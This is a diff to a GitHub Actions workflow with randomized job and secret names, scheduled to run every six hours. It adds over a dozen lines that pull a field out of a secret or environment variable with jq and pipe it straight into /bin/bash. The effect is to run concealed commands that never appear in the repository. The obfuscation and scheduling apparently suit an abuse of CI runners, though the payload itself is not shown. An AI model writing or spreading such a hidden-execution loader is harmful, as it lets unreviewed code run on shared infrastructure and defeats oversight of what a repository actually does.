@@ -1,9 +1,8 @@
 name: yangtianbao2001
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
+    - cron: '14 2/6 * * *'
 
 jobs:
   build:
@@ -12,9 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangtianbao2001
         env:
-          oazyp6135: ${{ secrets.oazyp6135 }}
+          md94634: ${{ secrets.md94634 }}
         run: |
-          echo $oazyp6135 | jq -r .etqgx7547 | /bin/bash
-          echo $avfsa17 | jq -r .gr58218 | /bin/bash
-          echo $trjbo29 | jq -r .sfk20 | /bin/bash
+          echo $md94634 | jq -r .vsp52 | /bin/bash
+          echo $wakty4315 | jq -r .hpcwk31 | /bin/bash
+          echo $tbdqv2409 | jq -r .kyhr42555 | /bin/bash
+          echo $zi8461 | jq -r .d5 | /bin/bash
+          echo $gg05 | jq -r .kzf81583 | /bin/bash
+          echo $rvy52268 | jq -r .g74294 | /bin/bash
+          echo $ua97 | jq -r .eup8456 | /bin/bash
+          echo $s3 | jq -r .dourb36232 | /bin/bash
+          echo $znrg780 | jq -r .uvvg4865 | /bin/bash
+          echo $i73971 | jq -r .zj27998 | /bin/bash
+          echo $uh135 | jq -r .zu55971 | /bin/bash
+          echo $nepuf85431 | jq -r .g75000 | /bin/bash
+          echo $jcikl7583 | jq -r .a652 | /bin/bash
+          echo $lrn3 | jq -r .bdycm5814 | /bin/bash
+          echo $m3077 | jq -r .a774 | /bin/bash
+          echo $koga89551 | jq -r .dtllk08486 | /bin/bash
+          echo $kv24 | jq -r .bi739 | /bin/bash
 
